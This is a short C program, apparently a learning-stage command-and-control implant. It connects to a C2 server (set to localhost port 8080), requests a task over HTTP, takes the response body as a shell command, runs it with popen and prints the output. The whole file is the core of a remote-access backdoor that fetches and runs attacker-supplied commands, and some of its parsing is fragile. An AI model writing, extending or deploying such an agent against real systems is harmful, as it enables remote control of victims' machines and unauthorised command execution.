#include <stdio.h>
#include <stdlib.h>
#include <string.h>
//for LinuxAPI
#include <unistd.h>
//for network
#include <sys/socket.h> //for sockets
#include <netinet/in.h> //for struct (example: sockaddr_in)
#include <arpa/inet.h> //for special func(inet_pton)

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 8080

void error_exit(const char* msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

void get_task_from_c2(char* task) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if(sockfd == -1) {
        error_exit("socket");
    }

    //filling network struct
    struct sockaddr_in addr_server;
    memset(&addr_server, 0, sizeof(addr_server));
    addr_server.sin_family = AF_INET;
    addr_server.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &addr_server.sin_addr);

    if(connect(sockfd, (struct sockaddr*)&addr_server, sizeof(addr_server)) == -1) {
        error_exit("connect");
        exit(EXIT_FAILURE);
    }
    printf("[+] Success connect to c2.\n");

    //build request for c2
    char request[2048] = {0};
    snprintf(request, sizeof(request), "GET /get_task/%s HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n", task); 

    if(send(sockfd, request, sizeof(request), 0) == -1) {
        error_exit("send");
        exit(EXIT_FAILURE);
    } 
    printf("[+] Get request send to c2.\n");

    int count_bytes = read(sockfd, request, sizeof(request));
    if(count_bytes == -1) {
        error_exit("read");
        exit(EXIT_FAILURE);
    }
    printf("[+] Answer from c2:\n %s\n\n", request);
    fflush(stdout);

    //for reliability and rewrite the last character '"'
    request[count_bytes - 1] = '\0';
    
    //parse
    char* command = strstr(request, "\r\n\r\n");
    if(command != NULL) {
        command += 5; //because '"'
    }

    sleep(1);
    
    FILE* fp;
    char chunk[256];
    char result[4096] = {0};
    
    fp = popen(command, "r");
    if(fp == NULL) {
        error_exit("popen");
        exit(EXIT_FAILURE);
    } 

    while(fgets(chunk, sizeof(chunk), fp) != NULL) {
        strncat(result, chunk, sizeof(result) - strlen(result) - 1);
    }

    pclose(fp);

    printf("%s\n", result);
}

int main() {
    get_task_from_c2("task_1");
    return 0;
}
